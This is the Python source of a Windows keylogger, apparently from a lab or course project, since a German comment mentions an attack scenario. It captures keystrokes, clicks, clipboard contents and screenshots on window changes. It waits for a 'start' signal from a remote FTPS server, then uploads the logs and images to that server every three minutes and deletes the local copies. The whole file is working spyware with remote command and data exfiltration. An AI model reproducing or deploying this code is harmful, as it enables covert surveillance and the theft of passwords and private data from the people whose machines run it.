'''REQUIRED MODULES/IMPORTS'''
import socket
import platform
import win32clipboard
import os
import time
import pynput
import psutil
from ftplib import FTP_TLS
from pynput.keyboard import Key
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from ctypes import *
import win32gui
import win32ui
import win32con
import win32api

'''DEFINITION OF REQUIRED VARIABLES'''
saved_window=None           # To save active window, initialized with None
saved_exe=None              # To save respective executable corresponding to active window, initialized with None
screenshot_no=0             # Screenshot-counter, initialized with 0
keys=[]                     # List to store keys/mouse-clicks, initialized as empty list

writecycleTime=10           # Every 10 seconds, the key storage is written to log.txt
uploadcycleTime=180         # Every 3 minutes, the log.txt and Screenshot-pngs are uploaded to FTP-Server
upload_cycle_no=0           # Counter to count number of uploads (required for directory-management on FTP-Server)

user32=windll.user32        #easier access to windows-tools
kernel32=windll.kernel32    #easier access to windows-tools
psapi=windll.psapi          #easier access to windows-tools


'''DEFINITION OF DIFFERENT FUNCTIONALITIES'''

'''
Function:   get_active_window()
Returns:    active window, title of active window and title of respective executable
Aim:        Required to notice window changes in order to make screenshots and
            store process information in key_log.txt
'''
def get_active_window():
    # Get PID
    pid = wintypes.DWORD()
    # Get handle to active window & thread
    active = user32.GetForegroundWindow()
    active_window = user32.GetWindowThreadProcessId(active,byref(pid))
    # Retrieve and store window title and name of executable
    length=user32.GetWindowTextLengthW(active)
    buf=create_unicode_buffer(length+1)
    user32.GetWindowTextW(active,buf,length+1)
    active_window_title=buf.value
    exe_title=psutil.Process(pid.value).name()
    #close handle
    kernel32.CloseHandle(active)

    return active_window,active_window_title,exe_title

'''
Function:   copy_clipboard()
Returns:    nothing
Aim:        Store current clipboard in key_log.txt
'''
def copy_clipboard():
    with open("key_log.txt","a+") as f:
        try:
            win32clipboard.OpenClipboard()
            zwischenablage_daten = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("ZWISCHENABLAGE:\n"+zwischenablage_daten+"\n")
        except:
            f.write("ZWISCHENABLAGE KONNTE NICHT KOPIERT WERDEN\n")

'''screenshot() not used due to performance issues'''
def screenshot():
    global screenshot_no
    image = ImageGrab.grab()
    image.save("Screenshot-" + str(screenshot_no) + "-" + str(saved_exe) + ".png")
    screenshot_no+=1

'''
Function:   screenshot2()
Returns:    nothing
Aim:        Function is called each time the current window is changed. It makes a screenshot and stores
            the screenshot as a png-file         
'''
def screenshot2():
    global screenshot_no
    hdesktop=win32gui.GetDesktopWindow()
    # determine the size of all monitors in pixels
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    # create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    # create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()
    # create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    # copy the screen into our memory device context
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, "Screenshot-" + str(screenshot_no) + "-" + str(saved_exe)+".png")
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    screenshot_no+=1

'''
Function:   on_press(key)
Returns:    nothing
Aim:        Function is called each time a key is pressed. Respective key is appended to key-storage "keys".
            After 10 Seconds, keys is written to file by calling the function write_file(keys).
Features:   - if the current window has changed, a screenshot is made using the function screenshot2()
            - if user presses STR+V, the clipboard-content is appended to key-storage using function copy_clipboard()            
'''
def on_press(key):
    global keys,currentTime,writeTime,writecycleTime,saved_window,saved_exe
    # get current_window, current_window_title and current_exe (title)
    current_window,current_window_title,current_exe = get_active_window()

    # IF: window has changend
    # THEN: take screenshot and note screenshot in key-storage "keys"
    if current_window != saved_window:
        # define current window as saved_window and current_exe (title) as saved_exe
        saved_window=current_window
        saved_exe=current_exe
        # take screenshot by calling function screenshot2()
        screenshot2()
        # write name of exe and window title to key-storage
        keys.append("<" + current_exe + " | " + current_window_title +">\n")

    # take current time to check if key storage needs to be written to key_log.txt
    currentTime=time.time()
    # format key and append key to key-storage
    k = str(key).replace("'","")
    keys.append(k)
    
    # if STR+V, call copy_clipboard-function
    if k=='\\x16':
        copy_clipboard()

    # if current time > write time: write key to file and reset keys and write time
    if currentTime > writeTime:
        write_file(keys)
        keys=[]
        writeTime=currentTime+writecycleTime

'''
On_release nur für Möglichkeit Keylogger auf dem Client zu stoppen, würde man im wirklichen
Angriffs-Fall natürlich nicht mit einbauen...
'''
def on_release(key):
    if key == Key.esc:
        mouse_listener.stop()
        return False

'''
Function:   on_click(key)
Returns:    nothing
Aim:        Function is called each time the mouse is clicked. Respective information is appended to key-storage "keys".
            After 10 Seconds, keys is written to file by calling the function write_file(keys).
Features:   - if the current window has changed, a screenshot is made using the function screenshot2()          
'''
def on_click(x,y,button,pressed):
    global keys,currentTime,writeTime,writecycleTime,saved_window,saved_exe
    # get current_window, current_window_title and current_exe (title)
    current_window,current_window_title,current_exe = get_active_window()
    if pressed:
        # IF: window has changend
        # THEN: take screenshot and note screenshot in key-storage "keys"
        if current_window != saved_window:
            # define current window as saved_window and current_exe (title) as saved_exe
            saved_window=current_window
            saved_exe=current_exe
            # take screenshot by calling function screenshot2()
            screenshot2()
            # write name of exe and window title to key-storage
            keys.append("<" + current_exe + " | " + current_window_title +">\n")

        # take current time to check if key storage needs to be written to key_log.txt
        currentTime=time.time()
        # append information that mouse was clicked to key-storage "keys"
        keys.append("<Mouse-Click>")
        keys.append("Key.space")

        # if current time > write time: write key to file and reset keys and write time
        if currentTime > writeTime:
            write_file(keys)
            keys=[]
            writeTime=currentTime+writecycleTime
        

'''
Function:   write_file(keys)
Returns:    nothing
Aim:        Store key-storage "keys" in file "key_log.txt".
Features:   - Certain special keys like spaces are replaced by e.g. new line in key_log.txt
'''
def write_file(keys):
    # Open key_log.txt in append mode
    with open("key_log.txt","a+") as f:
        # Iterate through key-storage
        for k in keys:
            # Replace Space by new line
            if k.find(".space") > 0:
                f.write("\n")
            # Replace Enter by newline + <ENTER> + new line   
            elif k.find(".enter") > 0:
                f.write("\n")
                f.write("<ENTER>")
                f.write("\n")
            # Replace Backspace by newline + <S> + new line   
            elif k.find(".backspace") > 0:
                f.write("\n")
                f.write("<BS>")
                f.write("\n")
            elif k.find("x16") > 0:
                f.write("")
            # Write other keyboard inputs to file
            elif k.find("Key") == -1:
                f.write(k)

'''
Function:   upload()
Returns:    nothing
Aim:        Upload "key_log.txt" and screenshots to FTPS-Server and delete existing files on client computer
Features:   - Files are marked with time-stamp
            - Upload-Cycles are counted
            - Directory-Management for server (new folders are created for each upload)
'''
def upload():
    global upload_cycle_no
    # Connect to FTP-Server and open secure TLS connection
    with FTP_TLS() as ftps:
        ftps.connect('192.168.189.128', 2121)
        ftps.login(user="user", passwd="12345")
        print(ftps.getwelcome())
        ftps.prot_p()

        # If targetfiles folder already exists, change to targetfiles folder on server
        if "targetfiles" in ftps.nlst():
            ftps.cwd("targetfiles")
        # Else make respective directory and change to it
        else:
            ftps.mkd("targetfiles")
            ftps.cwd("targetfiles")

        # Create directory for each upload     
        ftps.mkd(str(upload_cycle_no))
        ftps.cwd(str(upload_cycle_no))
        # List all files on client directory
        files=os.listdir(".")
        # Create time-stamp
        datetime=time.strftime("%Y-%m-%d-%H-%M-%S")
        # Iterate over files in client directory and upload png & txt files
        # Then delete files on client side and increas upload cycle counter
        for f in files:
            if ".png" in f:
                ftps.storbinary("STOR " + datetime+f,open(f,"rb"))
                os.remove(f)
            if ".txt" in f:
                ftps.storlines("STOR " + datetime+f,open(f,"rb"))
                os.remove(f)
        upload_cycle_no+=1

'''MAIN-FUNCTION OF KEYLOGGER'''

# Polling loop to get start-signal from server
while True:
    with FTP_TLS() as ftps:
        #establish connection to FTPS-Server
        ftps.connect('192.168.189.128', 2121)
        #log-in to FTPS-Server
        ftps.login(user="user", passwd="12345")
        print(ftps.getwelcome())
        #Set-up secure data-connection (TLS)
        ftps.prot_p()
        #Retrieve start signal from "start.txt" on server
        lines=[]
        ftps.retrlines("RETR " + "start.txt",lines.append)

    #IF:   Start-signal==start, e.g. if attacker wants to start logging
    #THEN: Start Logging & Uploading
    #ELSE: Sleep 30 seconds and check for tart-signal again   
    if(lines[0]=="start"):
        print("keylogger started")
        #Calculate time to write key-logs to "key-log.txt" (every 10seconds)
        writeTime=time.time() + writecycleTime
        #Calculate time to upload "key-log.txt" and respective screenshots to server
        uploadTime=time.time() + uploadcycleTime
        #Start keyboard an mouse listener
        key_listener = KeyListener(on_press=on_press, on_release=on_release)
        mouse_listener = MouseListener(on_click=on_click)
        key_listener.start()
        mouse_listener.start()
        
        #upload loop (upload files every 3 minutes)
        while True:
            #Get current time
            current_time=time.time()
            #IF:   current_time > uploadTime
            #THEN: start upload and calculate next uploadTime
            if current_time>uploadTime:
                print("Start Upload now!")
                upload()
                uploadTime=current_time + uploadcycleTime
    
    else:
        #if Start-Signal not set, then sleep 30 seconds and ask again
        print("not started...")
        time.sleep(30)